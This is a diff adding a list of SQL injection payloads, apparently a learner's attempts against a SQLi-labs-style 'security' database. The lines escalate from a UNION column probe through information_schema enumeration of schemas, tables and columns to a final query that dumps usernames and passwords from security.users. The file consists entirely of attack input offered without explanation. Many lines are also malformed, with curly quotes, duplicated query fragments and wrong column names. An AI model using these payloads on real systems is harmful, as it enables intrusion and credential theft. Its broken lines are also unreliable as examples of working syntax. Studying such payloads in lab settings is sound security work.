@@ -1,0 +1,21 @@
+ID:1
+ID:-1'union select 1,2,3 -- 
+ID:-1' SELECT * FROM users WHERE id=’-1’union select 1,group_concat(schema_name),3 from information_schema.schemata--  LIMIT 0,1
+ID:-1'union SELECT * FROM users WHERE id=’-1’union select 1,group_concat(schema_name),3 from information_schema.schemata--  LIMIT 0,1
+ID:-1'union select * from users where id='union select 1,group_concat(schema_name),3 from information_schema.schemata--  LIMIT 0,1
+ID:-1'union SELECT * FROM users WHERE id=’-1’union select 1,group_concat(schema_name),3 from information_schema.schemata--  LIMIT 0,1
+ID:-1'union SELECT * FROM users WHERE id=’-1’union select 1,group_concat(schema_name),3 from information_schema.schemata--  LIMIT 0,1
+ID:-1'union SELECT * FROM users WHERE id=’-1’ UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata LIMIT 0, 1 -- 
+ID:-1'union SELECT * FROM users WHERE id='-1' UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata LIMIT 0, 1 -- 
+ID:-1'union SELECT * FROM users WHERE id='-1' UNION SELECT 1, group_concat(schema_name), 3 FROM information_schema.schemata.tables where table_schema='security' LIMIT 0, 1 -- 
+ID:-1'union SELECT * FROM users WHERE id='-1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema='security' LIMIT 0,1 -- 
+ID:-1'union SELECT * FROM users WHERE id='-1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema='mysql' LIMIT 0,1 -- 
+ID:-1'union SELECT * FROM users WHERE id='-1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema='security'and table_name='user'  LIMIT 0,1 -- 
+ID:-1'union SELECT * FROM users WHERE id='-1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.columns WHERE columns_schema='users' LIMIT 0,1 -- 
+ID:-1'union SELECT * FROM users WHERE id=’-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’security’ and table_name=’users’--  LIMIT 0,1
+ID:-1'union SELECT * FROM users WHERE id=’-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’security’ and column_name=’users’--  LIMIT 0,1
+ID:-1'union SELECT * FROM users WHERE id=’-1’union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=’security’ and table_name=’users’--  LIMIT 0,1
+ID:-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = ‘security’ and table_name = ‘users’ --  LIMIT 0,1
+ID:-1'union SELECT * FROM users WHERE id=’-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = ‘security’ and table_name = ‘users’ --  LIMIT 0,1
+ID:-1'union SELECT * FROM users WHERE id='-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_schema = 'security' and table_name = 'users' --  LIMIT 0,1
+ID:-1'union select 1,group_concat(username),group_concat(password) from security.users -- LIMIT 1,2
